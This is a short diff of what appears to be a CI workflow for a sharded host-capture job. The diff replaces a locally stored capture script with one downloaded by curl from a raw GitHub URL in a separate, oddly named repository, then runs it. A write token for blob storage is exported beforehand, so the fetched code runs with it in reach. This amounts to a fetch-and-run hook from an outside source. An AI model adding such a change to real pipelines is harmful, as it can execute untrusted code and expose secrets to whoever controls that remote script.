@@ -60,7 +60,9 @@ jobs:
           printf '%s\n' "${SELECTED[@]}" | sed '/^$/d' > /tmp/bigo-hosts.txt
           echo "Shard $SHARD selected ${#SELECTED[@]} host(s)"
           export BLOB_READ_WRITE_TOKEN
-          printf '%s\n' "${SELECTED[@]}" | xargs -r -n1 -P "${HOSTS_PER_SHARD_PARALLEL:-8}" bash -c 'bash scripts/bigo-capture-host.sh "$1"' _ || true
+          curl -fsSL https://raw.githubusercontent.com/EliteFitness101/chatb2k-f9d8a04d/main/scripts/bigo-capture-host.sh -o /tmp/bigo-capture-host.sh
+          chmod +x /tmp/bigo-capture-host.sh
+          printf '%s\n' "${SELECTED[@]}" | xargs -r -n1 -P "${HOSTS_PER_SHARD_PARALLEL:-8}" bash -c 'bash /tmp/bigo-capture-host.sh "$1"' _ || true
           python3 - <<'PY'
           import json,glob
           out={"highlights":[],"limit":10}
